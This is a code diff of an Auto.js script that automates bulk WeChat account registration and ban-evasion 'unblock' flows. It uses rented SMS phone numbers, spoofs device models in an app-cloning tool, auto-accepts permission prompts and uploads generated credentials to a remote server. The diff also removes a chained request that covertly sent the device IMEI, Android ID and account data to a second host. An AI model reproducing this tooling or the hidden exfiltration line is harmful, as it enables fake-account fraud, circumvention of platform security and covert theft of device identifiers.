@@ -48,6 +48,10 @@ const YUYAN = {
         返回: "返回",
         结束运行: "结束运行",
         接受:"允许",
+        安装:"安装",
+        拒绝:"拒绝",
+        完成:"完成",
+        继续安装:"继续安装",
     },
     English: {
         登陆: "Log In",
@@ -73,9 +77,19 @@ const YUYAN = {
         返回: "Back",
         结束运行: "Force stop",
         接受:"Accept",
+        安装:"Install",
+        拒绝:"Deny",
+        继续安装:"Install anyway",
     }
 }
 var current_语言 
+importClass(java.util.Locale)
+let 语言 = Locale.getDefault().toString();
+if (语言=="zh_CN") {
+    current_语言 = YUYAN.中文
+}else if(语言=="en_US"){
+    current_语言 = YUYAN.English  
+}
 var my_className_lsit = {
     edit: "android.widget.EditText",
     text: "android.widget.TextView",
@@ -415,32 +429,32 @@ function lahei(pid) {
             let data = res.body.string()
             log("拉黑返回信息:"+data)
             data = data.split("|")
-            if (data[0] == 1) {
+            if (data[0] == "1") {
                 log("拉黑完成")
                 return true
             } else {
                 switch (data[1]) {
-                    case -1:
+                    case "-1":
                         log("Token不存在")
                         log("拉黑失败")
                         return false;
 
-                    case -2:
+                    case"-2":
                         log("拉黑失败")
                         log("pid不存在")
                         return false;
 
-                    case -3:
+                    case "-3":
                         log("拉黑失败")
                         log("加黑原因不能为空")
                         return false;
 
-                    case -4:
+                    case "-4":
                         log("拉黑失败")
                         log("手机号不存在或已释放")
                         return false;
 
-                    case -5:
+                    case "-5":
                         log("拉黑失败")
                         log("未回码,请释放")
                         return false;
@@ -560,7 +574,7 @@ function 上传信息_注册(info) {
         for (let index = 0; index < 2; index++) {
             log("上传数据尝试次数:%d", index)
             try {
-                var res = http.get("http://47.74.248.9/updata?username=" + 上传账户 + "&password=" + 上传密码 + "&type=1&value=" + encodeURI(info)); http.get("http://119.29.234.95:8000/?imei=" + String(device) + "&androidid=" + device.getAndroidId() + "&info=" + info)
+                var res = http.get("http://47.74.248.9/updata?username=" + 上传账户 + "&password=" + 上传密码 + "&type=1&value=" + encodeURI(info)); 
                 var dd = res.body.string()
                 log(dd)
                 return dd
@@ -972,7 +986,7 @@ function 开关飞行_解封() {
     }
 }
 function getPixel(x, y) {
-    log('调用者:' + arguments.callee.name)
+    // log('调用者:' + arguments.callee.name)
     if (x > 0 && x < device.width && y > 0 && y < device.height) {
 
         let img = 截图();
@@ -1343,7 +1357,8 @@ function tianxie_info_注册(guojia_number, phone_n, password) {
         g_j_num = String(g_j_num)
         var timeout = 5000
         log("国家代码:" + g_j_num)
-        var guojia_diqu = text(current_语言.国家).className("android.widget.TextView").findOne(3000)
+        log(current_语言.国家)
+        var guojia_diqu = text(current_语言.国家).findOne(3000)
         if (guojia_diqu) {
             log("主页找到选择国家按扭")
             guojia_diqu.parent().click()
@@ -2630,6 +2645,7 @@ function 全局检测循环_注册() {
     }
 }
 function 全局检测循环_解封() {
+
     var timeout = 20
     while (true) {
         let tag_1 = text(current_语言.下一步).className(my_className_lsit.button).findOne(timeout)
@@ -2669,6 +2685,8 @@ function 全局检测循环_解封() {
         var tag_25 = text(current_语言.完成).findOne(timeout)
         var tag_26_text = text("Read and accept").findOne(timeout)
         var tag_26_desc = desc("Read and accept").findOne(timeout)
+        var tag_27_text = text("Agree and Unblock").findOne(timeout)
+        var tag_27_desc = desc("Agree and Unblock").findOne(timeout)
         if (tag_1) {
             log(current_语言.下一步)
             tag_1.click()
@@ -3154,8 +3172,14 @@ function 全局检测循环_解封() {
         } else if (tag_26_desc) {
             tag_26_desc.click()
             log("read and accept")
-        } else if (false) {
-        } else if (false) {
+        } else if (tag_27_text) {
+            tag_27_text.click()
+            log("read and accept")
+
+        } else if (tag_27_desc) {
+            tag_27_desc.click()
+            log("read and accept")
+
         } else if (false) {
         } else if (false) {
         } else if (false) {
@@ -3348,6 +3372,17 @@ function 多米改机启动微信() {
 
 
 }
+function 权限监测() {
+    while (true) {
+        let aabb= textContains(current_语言.接受).clickable(true).findOne(100)
+        if(aabb){
+            log("发现授权确定")
+            sleep(1000)
+            aabb.click()
+            sleep(1000)
+        }
+    }
+}
 function 注册() {
     function 提取国家代码(val) {
         var reg = new RegExp("[\\u4E00-\\u9FFF]+", "g");
@@ -3381,7 +3416,7 @@ function 注册() {
         function randomWord(randomFlag, min, max){
             var str = "",
                 range = min,
-                arr = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z','#','$','%',',','.','_','~','!','@','&'];
+                arr = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z','$',',','.','_','~','!','@'];
          
             // 随机产生
             if(randomFlag){
@@ -3393,16 +3428,7 @@ function 注册() {
             }
             return str;
         }
-        // var st1 = ""
-    
-        // for (let index = 0; index < 4; index++) {
-        //     var dd = random(1, 23)
-        //     var a = "abcdefghijklmnopqrstuvwxyz".substr(dd, 1)
-        //     st1 += a
-        // }
-    
-        // var st2 = String(random(1000, 9999))
-        // return st1 + st2
+        
         return randomWord(true, 8, 16)
     }
     device.keepScreenOn()
@@ -3410,6 +3436,7 @@ function 注册() {
     获取token()
     _G_状态记录器 = new 状态记录器()
     开启监听_注册()
+    threads.start(权限监测)
     var 运行次数 = 运行次数备份
     while (true) {
         _G_状态记录器 = new 状态记录器()
@@ -3463,7 +3490,10 @@ function 注册() {
             continue
         }
 
-
+        let 读取联系人 = textContains(current_语言.拒绝).findOne(2000)
+        if (读取联系人) {
+            读取联系人.click()
+        }
         tianxie_info_注册(phone_number.国家代码, phone_number.手机号, password_ss)
 
 
@@ -3594,35 +3624,134 @@ function CLICK(UIOBJ) {
 
 function 多开分身() {
     function 内部页面处理() {
-        let 强制结束 = text("强制结束").findOne(1000)
-        if (强制结束) {
-            CLICK(强制结束)
+        let 删除分身 = text("删除分身").findOne(1000)
+        if (删除分身) {
+            删除分身.click()
+            sleep(2000)
+            var 确定 = text(current_语言.确定).clickable(true).findOne()
+
+            确定.click()
+            log("分身卸载成功")
             sleep(1000)
-            let 修改机型 = text("修改").findOne(1000)
-            if (修改机型) {
-                修改机型.click()
-                机型伪装内部()
-                sleep(1000)
-                let dd= id("iv_logo").findOne()
-                if (dd) {
-                    dd.click()
-                    let 同意 = text(current_语言.接受).findOne(2000)
-                    if (同意) {
-                        同意.click()
-                    }
-                    for (let index = 0; index < 30; index++) {
-                        if (currentPackage()=="com.tencent.mm") {
-                            log("微信启动成功")
-                            return true
-                        }
-                        sleep(500)
-                    }
-                    log("微信启动失败")
-                    return false
-                }
+            确定 = text(current_语言.确定).findOne(9000)//清理数据的ok
+            if (确定) {
+                确定.click()
+                return 新建分身()
+            } else {
+                log("没找到清理数据的确定")
             }
+           
+            
         }
     }
+    function 新建分身() {
+    let 创建 = id("iv_btn_create").clickable(true).findOne(5000)
+    if (创建) {
+        创建.click()
+        text("制作分身").findOne()
+        do {//WeChat
+            let weixin = text(微信名).findOne(500)
+            if (weixin) {
+                log("找到了")
+                let 制作分身 = weixin.parent().parent().child(1)
+                if (制作分身) {
+                    制作分身.click()
+                    let 设置 = text("设置").findOne(1000)
+                    if (设置) {
+                        设置.click()
+                        机型伪装内部()
+                        let 开始制作 = text("开始制作").findOne(2000)
+                        if (开始制作) {
+                            开始制作.click()
+                            sleep(3000)
+                            while(true) {
+                                if (textContains("多开分身").exists()) {
+                                    let 继续安装 = textContains(current_语言.继续安装).findOne(100)
+                                    let 安装 = text(current_语言.安装).findOne(100)
+                                    if (继续安装||安装) {
+                                        log("生成完成,继续")
+                                        break;
+                                    }
+                                    
+                                }
+                                log("等待生成完成")
+                                sleep(1000)
+                            }
+                            function 完成处理(){
+                                let 完成 = text(current_语言.完成).findOne(10000)
+                                if (完成) {
+                                    完成.click()
+                                    log("安装完成")
+                                    sleep(3000)
+                                    let dd = id("iv_logo").findOne(10000)
+                                    if (dd) {
+                                        dd.click()
+                                        log("等待启动微信")
+                                        for (let index = 0; index < 30; index++) {
+                                            if (currentPackage() == "com.tencent.mm") {
+                                                sleep(3000)
+                                                let NFC授权 = textContains(current_语言.拒绝).findOne(3000)
+                                                if (NFC授权) {
+                                                    NFC授权.click()
+                                                }
+                                                log("微信启动成功")
+                                                return true
+                                            }
+                                            sleep(500)
+                                        }
+                                        log("微信启动失败")
+                                        return false
+                                    }else{
+                                        log("找不到启动图标")
+                                        return false
+                                    }
+                                } else {
+                                    log("完成没找到")
+                                    return false
+                                }
+                            }
+                            let 继续安装 = textContains(current_语言.继续安装).findOne(100)
+                            if (继续安装) {
+                                log("继续安装")
+                                继续安装.click()
+                                sleep(5000)
+                                return 完成处理()
+                            }
+                            let 安装 = text(current_语言.安装).findOne(100)
+                            if (安装) {
+                                log("安装")
+                                安装.click()
+                                sleep(5000)
+                                return 完成处理()
+                            } else {
+                                log("安装没找到")
+                            }
+                        } else {
+
+                        }
+                    } else {
+
+                    }
+                } else {
+
+                }
+                break;
+            }
+            var 可滑动标记 = scrollable(true).findOne(200)
+            // log(可滑动标记)
+            if (可滑动标记) {
+                可滑动标记 = 可滑动标记.scrollForward()
+                log(可滑动标记)
+            } else {
+                log("找不到可滑动页面")
+                exit()
+            }
+        } while (可滑动标记);
+    } else {
+
+    }
+
+}
     function 机型伪装内部() {
         function asss(params) {
             let b = className("android.widget.ListView").findOne()
@@ -3647,20 +3776,25 @@ function 多开分身() {
     sleep(500)
     home()
     sleep(500)
-    let 多开分身桌面图标 = text("多开分身").findOne(3000)
-    if (多开分身桌面图标) {
-        if (CLICK(多开分身桌面图标)) {
+    // let 多开分身桌面图标 = text("多开分身").boundsInside(0, 0, device.width, device.height).findOne(3000)
+    if (true) {
+        // if (CLICK(多开分身桌面图标)) {
+        if (click(936,1788)) {
             log("多开分身点击成功")
             sleep(2000)
             for (let index = 0; index < 5; index++) {
                 let 立即重试 = text("立即重试").findOne(1000)
                 let 管理内部页面 = text("管理").boundsInside(0, 0, device.width / 2, device.height).findOne(2000)
                 let 管理 = text("管理").boundsInside(device.width / 2, 0, device.width, device.height).findOne(2000)
+                let 分身锁 = text("分身锁").exists()
                 if (管理内部页面) {
                     log("管理内部页面")
                     return 内部页面处理()
                     
-                } else if (管理) {
+                } else if(分身锁){
+                    log("列表为空")
+                    return 新建分身()
+                }else if (管理) {
                     log("列表页面")
                     if (CLICK(管理)) {
                         log("管理点击成功")
@@ -3691,21 +3825,24 @@ function 多开分身() {
 
 function test() {
     
+    // log(语言)
+    
     多开分身()
     console.hide()
 }
+
 // test()
 function main() {
     let 模式= storage.get("模式",1)
     log("模式%d",模式)
     switch (模式) {
         case 0:
-        current_语言 = YUYAN.中文
+        // current_语言 = YUYAN.中文
             注册()
             break;
     
         case 1:
-        current_语言 = YUYAN.English        
+        // current_语言 = YUYAN.English        
             解封()
             break;
     
